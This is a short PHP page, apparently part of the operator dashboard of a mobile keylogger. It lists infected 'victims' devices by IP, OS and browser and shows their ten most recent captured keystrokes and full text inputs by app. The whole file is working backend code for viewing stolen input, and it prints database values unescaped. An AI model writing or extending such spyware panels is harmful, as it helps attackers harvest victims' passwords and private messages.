<?php
// mobile_test.php - Check mobile connectivity
require_once 'config.php';

echo "<h2>📱 Mobile Test Page</h2>";

// Check if mobile is connecting
$mobile_ips = $conn->query("SELECT * FROM victims WHERE device_type = 'Mobile' ORDER BY last_active DESC");

echo "<h3>Mobile Devices Detected:</h3>";

if ($mobile_ips->num_rows > 0) {
    echo "<table border='1' cellpadding='10'>";
    echo "<tr><th>IP</th><th>OS</th><th>Browser</th><th>Last Active</th></tr>";
    while($row = $mobile_ips->fetch_assoc()) {
        echo "<tr>";
        echo "<td>" . $row['ip_address'] . "</td>";
        echo "<td>" . $row['os'] . "</td>";
        echo "<td>" . $row['browser'] . "</td>";
        echo "<td>" . $row['last_active'] . "</td>";
        echo "</tr>";
    }
    echo "</table>";
} else {
    echo "<p style='color:red;'>❌ No mobile devices detected yet</p>";
}

// Check recent keystrokes
$recent = $conn->query("SELECT * FROM keystrokes ORDER BY timestamp DESC LIMIT 10");

echo "<h3>Recent Keystrokes:</h3>";
if ($recent->num_rows > 0) {
    echo "<table border='1' cellpadding='10'>";
    echo "<tr><th>Time</th><th>App</th><th>Key</th><th>Value</th></tr>";
    while($row = $recent->fetch_assoc()) {
        echo "<tr>";
        echo "<td>" . $row['timestamp'] . "</td>";
        echo "<td>" . $row['app_name'] . "</td>";
        echo "<td>" . $row['key_pressed'] . "</td>";
        echo "<td>" . $row['full_input'] . "</td>";
        echo "</tr>";
    }
    echo "</table>";
} else {
    echo "<p>No keystrokes yet</p>";
}

echo "<br><a href='view.php'>Back to Dashboard</a>";
?>